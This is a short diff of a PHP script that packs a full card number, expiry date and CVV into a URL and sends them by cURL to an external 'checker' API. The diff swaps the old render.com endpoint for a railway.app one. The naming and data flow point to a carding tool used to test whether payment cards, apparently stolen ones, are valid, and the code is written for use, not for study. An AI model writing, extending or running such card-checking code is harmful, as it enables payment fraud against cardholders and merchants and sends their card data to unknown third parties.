@@ -324,9 +324,10 @@ if (!$validation['valid']) {
     exit;
 }
 
-// Call external Stripe checker API
+// Call external checker API
 $ccParam = urlencode($num . '|' . $expm . '|' . $expy . '|' . $cvv);
-$apiUrl = 'https://toenv-stripe-98-7.onrender.com/key=@OnyxEnvBot/cc=' . $ccParam;
+// Archived: $apiUrl = 'https://toenv-stripe-98-7.onrender.com/key=@OnyxEnvBot/cc=' . $ccParam;
+$apiUrl = 'https://onyxenvbot.up.railway.app/chaos/key=yashikaaa/cc=' . $ccParam;
 
 $ch = curl_init();
 curl_setopt_array($ch, [
